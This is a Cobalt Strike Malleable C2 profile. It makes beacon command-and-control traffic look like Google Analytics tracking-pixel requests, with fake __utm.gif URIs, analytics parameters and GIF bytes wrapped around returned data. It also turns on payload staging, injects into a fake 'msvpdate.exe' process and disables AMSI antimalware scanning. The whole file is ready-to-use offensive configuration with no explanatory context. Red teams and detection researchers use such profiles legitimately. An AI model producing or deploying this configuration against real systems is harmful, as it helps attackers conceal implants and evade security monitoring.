#webbug_getonly

set sleeptime "1500";

set host_stage "true";

http-get {
	set uri "/___utm.gif";
	client {
		parameter "utmac" "UA-9038081-2";
		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";
		
		header "Host" "Google Bot";
		
		metadata {
			base64url;
			prepend "__utma";
			parameter "utmcc";
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			# hexdump pixel.gif
			# 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
			# 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
			# 0000020 01 00 01 00 00 02 01 44 00 3b 
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";

			print;
		}
	}
}

http-post {
	set uri "/__utm.gif";
	set verb "GET";
	client {
		id {
			prepend "UA-499";
			append "-2";
			parameter "utmac";
		}

		parameter "utmcn" "1";
		parameter "utmcs" "ISO-8859-1";
		parameter "utmsr" "1280x1024";
		parameter "utmsc" "32-bit";
		parameter "utmul" "en-US";
		
		header "Host" "Google Bot";
		
		output {
			base64url;
			prepend "__utma";
			parameter "utmcc";
		}
	}

	server {
		header "Content-Type" "image/gif";

		output {
			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
			prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
			prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
			print;
		}
	}
}

# dress up the staging process too
http-stager {
	server {
		header "Content-Type" "image/gif";
	}
}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\msvpdate.exe";
	set spawnto_x64 "%windir%\\sysnative\\msvpdate.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}
